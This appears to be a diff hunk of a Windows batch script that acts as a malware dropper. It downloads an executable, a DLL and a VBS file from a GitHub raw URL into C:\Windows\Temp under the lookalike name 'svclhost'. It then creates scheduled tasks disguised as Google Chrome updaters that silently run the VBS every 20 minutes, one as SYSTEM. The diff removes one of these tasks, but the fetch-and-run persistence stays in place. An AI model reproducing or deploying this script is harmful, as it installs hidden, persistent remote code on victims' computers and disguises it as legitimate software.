@@ -5,8 +5,6 @@ curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssl-3.d
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.exe > C:\Windows\Temp\svclhost.exe
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.vbs > C:\Windows\Temp\svclhost.vbs
 set tt=%time:~0,5%
-SCHTASKS /CREATE /SC MINUTE /MO 60 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST 07:00 /F >nul 2>&1
-SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" >nul 2>&1
 SCHTASKS /CREATE /SC MINUTE /MO 20 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /F >nul 2>&1
 SCHTASKS /CREATE /SC MINUTE /MO 20 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /RU system /F >nul 2>&1
 SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" >nul 2>&1
